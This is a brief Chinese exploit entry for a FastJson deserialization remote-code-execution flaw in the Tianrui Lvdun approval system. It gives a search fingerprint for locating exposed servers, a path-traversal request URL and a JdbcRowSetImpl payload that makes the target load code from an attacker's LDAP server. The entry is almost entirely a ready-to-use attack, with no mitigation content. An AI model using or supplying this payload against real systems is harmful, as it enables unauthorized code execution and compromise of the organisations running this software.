# 天锐绿盾审批系统asign存在FastJson反序列化RCE漏洞

天锐绿盾 ｜ 命令执行 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/rest/ext/mail/add/asign HTTP/1.1`

**Payload**
```
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://vpsip:1389/TomcatBypass/TomcatEcho",
"autoCommit": true
```
- **响应特征**：200